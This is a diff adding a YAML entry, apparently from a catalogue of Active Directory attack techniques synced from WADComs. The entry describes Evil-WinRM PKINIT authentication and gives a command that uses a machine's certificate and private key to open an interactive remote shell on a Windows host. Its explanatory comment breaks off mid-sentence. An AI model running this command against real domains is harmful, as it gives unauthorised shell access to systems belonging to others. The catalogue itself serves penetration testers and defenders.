@@ -1,0 +1,29 @@
+id: wadcoms/evil-winrm-pkinit
+type: technique
+platform: active-directory
+name: Evil Winrm PKINIT
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- pfx
+commands:
+- template: evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP
+  comment: Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell
+    on the Windows host. Winrm Supports PKINIT, meaning if you have a computers PFX file, you can authenticate
+    and get a shell. Note that the command requires a public and a private key in P
+references:
+- https://github.com/Hackplayers/evil-winrm
+- https://book.hacktricks.xyz/cryptography/certificates
+tags:
+- active-directory
+- wadcoms
+- wmi
